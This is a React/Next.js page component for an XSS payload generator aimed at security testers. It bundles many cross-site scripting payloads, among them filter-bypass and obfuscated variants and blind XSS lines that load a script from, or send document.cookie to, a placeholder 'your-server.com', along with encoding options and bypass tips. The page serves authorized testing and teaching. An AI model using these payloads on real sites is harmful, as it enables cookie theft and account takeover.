'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';

interface PayloadCategory {
  id: string;
  name: string;
  description: string;
  payloads: XSSPayload[];
}

interface XSSPayload {
  id: string;
  name: string;
  payload: string;
  description: string;
  context: string[];
  severity: 'low' | 'medium' | 'high';
  tags: string[];
}

const XSS_CONTEXTS = [
  { id: 'html', name: 'HTML Context', description: 'Payload will be inserted into HTML content' },
  { id: 'attribute', name: 'HTML Attribute', description: 'Payload will be inserted into an HTML attribute' },
  { id: 'script', name: 'Script Context', description: 'Payload will be inserted into JavaScript code' },
  { id: 'style', name: 'CSS Context', description: 'Payload will be inserted into CSS styles' },
  { id: 'url', name: 'URL Context', description: 'Payload will be part of a URL' },
  { id: 'comment', name: 'HTML Comment', description: 'Payload will be inserted into HTML comments' }
];

const ENCODING_OPTIONS = [
  { id: 'none', name: 'No Encoding', transform: (payload: string) => payload },
  { id: 'url', name: 'URL Encoding', transform: (payload: string) => encodeURIComponent(payload) },
  { id: 'html', name: 'HTML Entities', transform: (payload: string) => payload.replace(/[<>&"']/g, (match) => {
    const map: {[key: string]: string} = { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#x27;' };
    return map[match];
  })},
  { id: 'unicode', name: 'Unicode Escape', transform: (payload: string) => payload.split('').map(char => '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0')).join('') },
  { id: 'hex', name: 'Hex Encoding', transform: (payload: string) => payload.split('').map(char => '%' + char.charCodeAt(0).toString(16).toUpperCase()).join('') }
];

const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: 'basic',
    name: 'Basic XSS Payloads',
    description: 'Simple, commonly used XSS payloads for initial testing',
    payloads: [
      {
        id: 'alert1',
        name: 'Basic Alert',
        payload: '<script>alert(1)</script>',
        description: 'Most basic XSS payload using script tags',
        context: ['html'],
        severity: 'high',
        tags: ['basic', 'script']
      },
      {
        id: 'img-onerror',
        name: 'Image OnError',
        payload: '<img src=x onerror=alert(1)>',
        description: 'Uses image tag with onerror event handler',
        context: ['html'],
        severity: 'high',
        tags: ['basic', 'event-handler']
      },
      {
        id: 'svg-onload',
        name: 'SVG OnLoad',
        payload: '<svg onload=alert(1)>',
        description: 'SVG element with onload event',
        context: ['html'],
        severity: 'high',
        tags: ['basic', 'svg']
      },
      {
        id: 'input-autofocus',
        name: 'Input AutoFocus',
        payload: '<input autofocus onfocus=alert(1)>',
        description: 'Input element that automatically focuses and triggers XSS',
        context: ['html'],
        severity: 'high',
        tags: ['basic', 'input']
      }
    ]
  },
  {
    id: 'filter-bypass',
    name: 'Filter Bypass Payloads',
    description: 'Payloads designed to bypass common XSS filters and WAFs',
    payloads: [
      {
        id: 'case-variation',
        name: 'Case Variation',
        payload: '<ScRiPt>alert(1)</ScRiPt>',
        description: 'Mixed case to bypass case-sensitive filters',
        context: ['html'],
        severity: 'high',
        tags: ['bypass', 'case-variation']
      },
      {
        id: 'double-encoding',
        name: 'Double Encoded',
        payload: '%253Cscript%253Ealert(1)%253C/script%253E',
        description: 'Double URL encoded payload',
        context: ['url'],
        severity: 'medium',
        tags: ['bypass', 'encoding']
      },
      {
        id: 'javascript-protocol',
        name: 'JavaScript Protocol',
        payload: 'javascript:alert(1)',
        description: 'Uses javascript: protocol in href or src attributes',
        context: ['attribute'],
        severity: 'high',
        tags: ['bypass', 'protocol']
      },
      {
        id: 'html5-events',
        name: 'HTML5 Events',
        payload: '<body onpageshow=alert(1)>',
        description: 'Uses newer HTML5 events less likely to be filtered',
        context: ['html'],
        severity: 'high',
        tags: ['bypass', 'html5']
      },
      {
        id: 'unicode-bypass',
        name: 'Unicode Bypass',
        payload: '<script>\\u0061lert(1)</script>',
        description: 'Uses Unicode encoding to bypass string matching',
        context: ['script'],
        severity: 'high',
        tags: ['bypass', 'unicode']
      }
    ]
  },
  {
    id: 'context-specific',
    name: 'Context-Specific Payloads',
    description: 'Payloads optimized for specific injection contexts',
    payloads: [
      {
        id: 'attribute-break',
        name: 'Attribute Context Break',
        payload: '" onmouseover="alert(1)" "',
        description: 'Breaks out of attribute context',
        context: ['attribute'],
        severity: 'high',
        tags: ['context', 'attribute']
      },
      {
        id: 'script-string-break',
        name: 'JavaScript String Break',
        payload: '\';alert(1);//',
        description: 'Breaks out of JavaScript string context',
        context: ['script'],
        severity: 'high',
        tags: ['context', 'javascript']
      },
      {
        id: 'css-expression',
        name: 'CSS Expression',
        payload: 'expression(alert(1))',
        description: 'CSS expression for style context (IE)',
        context: ['style'],
        severity: 'medium',
        tags: ['context', 'css']
      },
      {
        id: 'comment-break',
        name: 'HTML Comment Break',
        payload: '--><script>alert(1)</script><!--',
        description: 'Breaks out of HTML comment context',
        context: ['comment'],
        severity: 'high',
        tags: ['context', 'comment']
      }
    ]
  },
  {
    id: 'advanced',
    name: 'Advanced & Obfuscated',
    description: 'Advanced payloads using obfuscation and encoding techniques',
    payloads: [
      {
        id: 'dom-clobbering',
        name: 'DOM Clobbering',
        payload: '<form id=x tabindex=0 onfocus=alert(1)></form>',
        description: 'Uses DOM clobbering technique',
        context: ['html'],
        severity: 'high',
        tags: ['advanced', 'dom']
      },
      {
        id: 'template-literal',
        name: 'Template Literal',
        payload: '`${alert(1)}`',
        description: 'Uses ES6 template literals',
        context: ['script'],
        severity: 'high',
        tags: ['advanced', 'es6']
      },
      {
        id: 'event-constructor',
        name: 'Event Constructor',
        payload: '<img src=1 onerror=new Function`al\\x65rt\\x281\\x29```>',
        description: 'Uses Function constructor with template literals',
        context: ['html'],
        severity: 'high',
        tags: ['advanced', 'constructor']
      },
      {
        id: 'polyglot',
        name: 'Polyglot Payload',
        payload: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        description: 'Works in multiple contexts',
        context: ['html', 'attribute', 'script'],
        severity: 'high',
        tags: ['advanced', 'polyglot']
      }
    ]
  },
  {
    id: 'blind',
    name: 'Blind XSS Payloads',
    description: 'Payloads for detecting XSS in contexts where you cannot see the output',
    payloads: [
      {
        id: 'external-script',
        name: 'External Script Load',
        payload: '<script src="https://your-server.com/xss.js"></script>',
        description: 'Loads external script for blind XSS detection',
        context: ['html'],
        severity: 'high',
        tags: ['blind', 'external']
      },
      {
        id: 'fetch-callback',
        name: 'Fetch Callback',
        payload: '<script>fetch("https://your-server.com/xss?"+document.domain)</script>',
        description: 'Sends callback with domain information',
        context: ['html'],
        severity: 'high',
        tags: ['blind', 'callback']
      },
      {
        id: 'image-callback',
        name: 'Image Callback',
        payload: '<img src="https://your-server.com/xss.gif?"+document.cookie>',
        description: 'Uses image to send data via GET request',
        context: ['html'],
        severity: 'medium',
        tags: ['blind', 'data-exfil']
      }
    ]
  }
];

export default function XSSPayloadGenerator() {
  const [selectedCategory, setSelectedCategory] = useState<string>('basic');
  const [selectedContext, setSelectedContext] = useState<string>('html');
  const [selectedEncoding, setSelectedEncoding] = useState<string>('none');
  const [customCallback, setCustomCallback] = useState<string>('');
  const [copiedPayload, setCopiedPayload] = useState<string>('');

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedPayload(text);
      setTimeout(() => setCopiedPayload(''), 2000);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

  const applyEncoding = (payload: string) => {
    const encoding = ENCODING_OPTIONS.find(e => e.id === selectedEncoding);
    if (!encoding) return payload;
    
    let processedPayload = payload;
    
    // Replace callback URL if custom callback is provided
    if (customCallback && payload.includes('your-server.com')) {
      processedPayload = processedPayload.replace(/https:\/\/your-server\.com/g, customCallback);
    }
    
    return encoding.transform(processedPayload);
  };

  const filteredPayloads = PAYLOAD_CATEGORIES
    .find(cat => cat.id === selectedCategory)?.payloads
    .filter(payload => payload.context.includes(selectedContext) || selectedContext === 'all') || [];

  return (
    <div className="max-w-6xl mx-auto">
      <div className="space-y-8 px-4">
        <div>
          <h1 className="text-3xl font-bold mb-4">XSS Payload Generator</h1>
          <p className="text-gray-300 mb-6">
            Generate context-aware XSS payloads for security testing. Choose your target context, 
            encoding preferences, and payload category to get customized XSS vectors.
          </p>
          
          {/* Educational Notice */}
          <div className="p-4 bg-blue-900/30 border border-blue-800 rounded-md mb-6">
            <h3 className="text-lg font-semibold mb-2 text-blue-300">🎓 Educational Resources</h3>
            <p className="text-blue-200 mb-2">Enhance your XSS knowledge with our comprehensive guides:</p>
            <ul className="list-disc pl-6 space-y-1 text-blue-200">
              <li><Link href="/docs/owasp-juice-shop-guide" className="text-blue-400 hover:underline">OWASP Juice Shop Attack Guide</Link> - Practice XSS in a safe environment</li>
              <li><Link href="/docs/owasp-top-10" className="text-blue-400 hover:underline">OWASP Top 10 Guide</Link> - Learn about XSS fundamentals</li>
              <li><Link href="/docs/burp-suite-cheatsheet" className="text-blue-400 hover:underline">Burp Suite Cheatsheet</Link> - Tools for XSS testing</li>
            </ul>
          </div>
        </div>

        {/* Configuration Panel */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          {/* Context Selection */}
          <div className="card">
            <h3 className="text-lg font-semibold mb-3 text-primary">Injection Context</h3>
            <div className="space-y-2">
              <label className="flex items-center space-x-2">
                <input 
                  type="radio" 
                  name="context" 
                  value="all" 
                  checked={selectedContext === 'all'}
                  onChange={(e) => setSelectedContext(e.target.value)}
                  className="text-primary"
                />
                <span>All Contexts</span>
              </label>
              {XSS_CONTEXTS.map(context => (
                <label key={context.id} className="flex items-center space-x-2">
                  <input 
                    type="radio" 
                    name="context" 
                    value={context.id} 
                    checked={selectedContext === context.id}
                    onChange={(e) => setSelectedContext(e.target.value)}
                    className="text-primary"
                  />
                  <div>
                    <span className="block">{context.name}</span>
                    <span className="text-sm text-gray-400">{context.description}</span>
                  </div>
                </label>
              ))}
            </div>
          </div>

          {/* Encoding Options */}
          <div className="card">
            <h3 className="text-lg font-semibold mb-3 text-primary">Encoding</h3>
            <div className="space-y-2">
              {ENCODING_OPTIONS.map(encoding => (
                <label key={encoding.id} className="flex items-center space-x-2">
                  <input 
                    type="radio" 
                    name="encoding" 
                    value={encoding.id} 
                    checked={selectedEncoding === encoding.id}
                    onChange={(e) => setSelectedEncoding(e.target.value)}
                    className="text-primary"
                  />
                  <span>{encoding.name}</span>
                </label>
              ))}
            </div>
          </div>

          {/* Custom Settings */}
          <div className="card">
            <h3 className="text-lg font-semibold mb-3 text-primary">Custom Settings</h3>
            <div className="space-y-3">
              <div>
                <label className="block text-sm font-medium mb-1">Custom Callback URL</label>
                <input 
                  type="text" 
                  placeholder="https://your-domain.com"
                  value={customCallback}
                  onChange={(e) => setCustomCallback(e.target.value)}
                  className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded focus:border-primary focus:outline-none"
                />
                <p className="text-xs text-gray-400 mt-1">For blind XSS payloads</p>
              </div>
            </div>
          </div>
        </div>

        {/* Category Selection */}
        <div className="mb-6">
          <h3 className="text-lg font-semibold mb-3 text-primary">Payload Categories</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-3">
            {PAYLOAD_CATEGORIES.map(category => (
              <button
                key={category.id}
                onClick={() => setSelectedCategory(category.id)}
                className={`p-3 rounded border transition-colors ${
                  selectedCategory === category.id 
                    ? 'bg-primary text-black border-primary' 
                    : 'bg-gray-800 border-gray-600 hover:border-primary'
                }`}
              >
                <div className="text-sm font-medium">{category.name}</div>
                <div className="text-xs opacity-75 mt-1">{category.description}</div>
              </button>
            ))}
          </div>
        </div>

        {/* Payload Display */}
        <div className="space-y-4">
          <h3 className="text-lg font-semibold text-primary">
            {PAYLOAD_CATEGORIES.find(cat => cat.id === selectedCategory)?.name} 
            {selectedContext !== 'all' && ` (${XSS_CONTEXTS.find(ctx => ctx.id === selectedContext)?.name})`}
          </h3>
          
          {filteredPayloads.length === 0 ? (
            <div className="card text-center py-8">
              <p className="text-gray-400">No payloads available for the selected context. Try selecting "All Contexts" or a different category.</p>
            </div>
          ) : (
            <div className="grid gap-4">
              {filteredPayloads.map(payload => {
                const encodedPayload = applyEncoding(payload.payload);
                return (
                  <div key={payload.id} className="card">
                    <div className="flex justify-between items-start mb-3">
                      <div>
                        <h4 className="font-semibold text-primary">{payload.name}</h4>
                        <p className="text-sm text-gray-400 mt-1">{payload.description}</p>
                      </div>
                      <div className="flex space-x-2">
                        <span className={`px-2 py-1 text-xs rounded ${
                          payload.severity === 'high' ? 'bg-red-900 text-red-200' :
                          payload.severity === 'medium' ? 'bg-yellow-900 text-yellow-200' :
                          'bg-green-900 text-green-200'
                        }`}>
                          {payload.severity}
                        </span>
                        {payload.tags.map(tag => (
                          <span key={tag} className="px-2 py-1 text-xs bg-gray-700 text-gray-300 rounded">
                            {tag}
                          </span>
                        ))}
                      </div>
                    </div>
                    
                    <div className="relative">
                      <pre className="bg-gray-900 p-3 rounded text-sm overflow-x-auto border">
                        <code>{encodedPayload}</code>
                      </pre>
                      <button
                        onClick={() => copyToClipboard(encodedPayload)}
                        className={`absolute top-2 right-2 px-3 py-1 text-xs rounded transition-colors ${
                          copiedPayload === encodedPayload 
                            ? 'bg-green-600 text-white' 
                            : 'bg-gray-700 hover:bg-gray-600 text-gray-300'
                        }`}
                      >
                        {copiedPayload === encodedPayload ? '✓ Copied' : 'Copy'}
                      </button>
                    </div>
                    
                    <div className="mt-2 text-xs text-gray-400">
                      <strong>Contexts:</strong> {payload.context.join(', ')}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Educational Section */}
        <div className="mt-12 space-y-6">
          <h3 className="text-2xl font-semibold text-primary">XSS Testing Guide</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="card">
              <h4 className="text-lg font-semibold mb-3 text-primary">🎯 Testing Methodology</h4>
              <ol className="list-decimal pl-6 space-y-2 text-sm text-gray-300">
                <li>Identify input points and injection contexts</li>
                <li>Start with basic payloads to test for filtering</li>
                <li>Use context-specific payloads based on where your input appears</li>
                <li>Try bypass techniques if basic payloads are blocked</li>
                <li>Use encoding if special characters are filtered</li>
                <li>Test with blind XSS payloads for admin panels</li>
              </ol>
            </div>

            <div className="card">
              <h4 className="text-lg font-semibold mb-3 text-primary">🛡️ Common Filters & Bypasses</h4>
              <ul className="list-disc pl-6 space-y-2 text-sm text-gray-300">
                <li><strong>Script tag blocking:</strong> Use event handlers or other tags</li>
                <li><strong>Case sensitivity:</strong> Try mixed case variations</li>
                <li><strong>Keyword filtering:</strong> Use encoding or alternative functions</li>
                <li><strong>Angle bracket filtering:</strong> Use existing tags or attributes</li>
                <li><strong>Quote filtering:</strong> Use different quote types or escape sequences</li>
              </ul>
            </div>

            <div className="card">
              <h4 className="text-lg font-semibold mb-3 text-primary">⚠️ XSS Types</h4>
              <div className="space-y-2 text-sm text-gray-300">
                <div><strong>Reflected XSS:</strong> Payload executed immediately from request</div>
                <div><strong>Stored XSS:</strong> Payload stored and executed for other users</div>
                <div><strong>DOM XSS:</strong> Payload executed via DOM manipulation</div>
                <div><strong>Blind XSS:</strong> Payload executed in contexts you can't see</div>
              </div>
            </div>

            <div className="card">
              <h4 className="text-lg font-semibold mb-3 text-primary">🔧 Recommended Tools</h4>
              <ul className="list-disc pl-6 space-y-2 text-sm text-gray-300">
                <li><Link href="/docs/burp-suite-cheatsheet" className="text-primary hover:underline">Burp Suite</Link> - Web application security testing</li>
                <li><strong>OWASP ZAP:</strong> Free security testing proxy</li>
                <li><strong>XSS Hunter:</strong> Blind XSS detection service</li>
                <li><Link href="/docs/owasp-juice-shop-guide" className="text-primary hover:underline">OWASP Juice Shop</Link> - Practice environment</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Disclaimer */}
        <div className="mt-8 p-4 bg-red-900/20 border border-red-600 rounded-md">
          <h4 className="text-lg font-semibold mb-2 text-red-400">⚠️ Important Disclaimer</h4>
          <p className="text-red-200 text-sm">
            These XSS payloads are provided for educational purposes and authorized security testing only. 
            Always ensure you have explicit permission before testing any application. Unauthorized testing 
            is illegal and unethical. Use responsibly and in compliance with applicable laws and regulations.
          </p>
        </div>
      </div>
    </div>
  );
} 